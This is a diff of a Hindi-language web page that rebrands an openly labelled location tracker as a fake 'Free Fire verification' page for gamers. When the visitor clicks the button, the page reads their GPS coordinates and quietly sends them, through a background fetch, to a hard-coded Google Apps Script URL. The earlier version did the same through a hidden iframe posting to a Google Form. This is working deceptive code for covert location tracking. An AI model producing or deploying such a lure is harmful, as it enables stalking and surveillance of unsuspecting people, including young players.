@@ -3,106 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Auto-Fill Portal</title>
+    <title>Live Location Tracker</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #eef2f7;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .tracker-card {
-            background: #ffffff;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-            text-align: center;
-            width: 350px;
-        }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
         h2 { color: #1a73e8; margin-bottom: 10px; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
-        .btn-submit {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            transition: transform 0.2s, background 0.3s;
-        }
-        .btn-submit:hover {
-            background-color: #1557b0;
-            transform: translateY(-2px);
-        }
-        #status-msg {
-            margin-top: 20px;
-            font-size: 14px;
-            min-height: 20px;
-        }
-        .success { color: #28a745; font-weight: bold; }
-        .error { color: #d93025; font-weight: bold; }
-        .loading { color: #f9ab00; }
+        p { color: #555; font-size: 15px; margin-bottom: 25px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 15px 25px; border-radius: 10px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; transition: background 0.3s; }
+        .btn:hover { background: #1557b0; }
+        #status { margin-top: 20px; font-weight: bold; font-size: 14px; }
     </style>
 </head>
 <body>
 
-<div class="tracker-card">
-    <h2>लोकेशन ट्रैकर</h2>
-    <p>बटन पर क्लिक करते ही आपकी लोकेशन सीधे गूगल फॉर्म में सबमिट हो जाएगी।</p>
-    
-    <button class="btn-submit" onclick="startTracking()">लोकेशन सबमिट करें</button>
-    
-    <div id="status-msg"></div>
-
-    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+<div class="box">
+    <h2>Free Fire वेरिफिकेशन</h2>
+    <p>अपना मैप देखने और सुरक्षित रूप से Free Fire वेरिफिकेशन शेयर करने के लिए नीचे बटन दबाएं।</p>
+    <button class="btn" onclick="sendLocation()">Free Fire वेरिफिकेशन भेजें</button>
+    <div id="status"></div>
 </div>
 
 <script>
-    function startTracking() {
-        const msg = document.getElementById('status-msg');
+    function sendLocation() {
+        const status = document.getElementById('status');
         
         if (navigator.geolocation) {
-            msg.className = "loading";
-            msg.innerText = "GPS सिग्नल खोजा जा रहा है...";
-            
+            status.innerText = "जीपीएस सिग्नल खोजा जा रहा है...";
+            status.style.color = "#f9ab00";
+
             navigator.geolocation.getCurrentPosition(function(position) {
+                // आपका दिया हुआ Web App URL यहाँ डाल दिया गया है
+                const scriptURL = "https://script.google.com/macros/s/AKfycbwfrDCTA3evWq7FCFrJ5MRYi2zaah93nHUgeh4WT8kldpHQQ6AE5CvMDs1F3xHCtbhj/exec";
+                
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
-                const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+                const finalUrl = `${scriptURL}?lat=${lat}&lng=${lng}`;
 
-                // आपकी फॉर्म डिटेल्स (लिंक और इमेज के अनुसार)
-                const FORM_ID = "1ZB-62ZH138zFuJ2lLyiiwwOeD9rVstUVdGiiT1oC4-A";
-                const ENTRY_LAT = "entry.1723883741";
-                const ENTRY_LNG = "entry.1285934641";
-                const ENTRY_MAP = "entry.630484221";
+                // बैकग्राउंड में डेटा भेजना
+                fetch(finalUrl, { mode: 'no-cors' })
+                .then(() => {
+                    status.innerText = "✅ आपकी लोकेशन सफलतापूर्वक भेज दी गई है!";
+                    status.style.color = "green";
+                })
+                .catch(() => {
+                    status.innerText = "❌ भेजने में समस्या हुई। कृपया पुनः प्रयास करें।";
+                    status.style.color = "red";
+                });
 
-                // फॉर्म रिस्पॉन्स URL तैयार करना
-                const finalActionUrl = `https://docs.google.com/forms/d/e/${FORM_ID}/formResponse?${ENTRY_LAT}=${lat}&${ENTRY_LNG}=${lng}&${ENTRY_MAP}=${encodeURIComponent(mapUrl)}&submit=Submit`;
-
-                // इफ़्रेम के जरिए चुपचाप सबमिट करना
-                const iframe = document.getElementById('hidden_iframe');
-                iframe.src = finalActionUrl;
-
-                msg.className = "success";
-                msg.innerText = "सफलतापूर्वक सबमिट कर दिया गया!";
-                
             }, function(error) {
-                msg.className = "error";
+                status.style.color = "red";
                 if(error.code == 1) {
-                    msg.innerText = "त्रुटि: कृपया लोकेशन की अनुमति दें।";
+                    status.innerText = "⚠️ कृपया लोकेशन एक्सेस की अनुमति (Allow) दें।";
                 } else {
-                    msg.innerText = "त्रुटि: लोकेशन नहीं मिल पाई।";
+                    status.innerText = "⚠️ लोकेशन प्राप्त करने में विफल।";
                 }
             });
         } else {
-            msg.className = "error";
-            msg.innerText = "आपका ब्राउज़र GPS सपोर्ट नहीं करता।";
+            status.innerText = "आपका फोन GPS सपोर्ट नहीं करता।";
         }
     }
 </script>
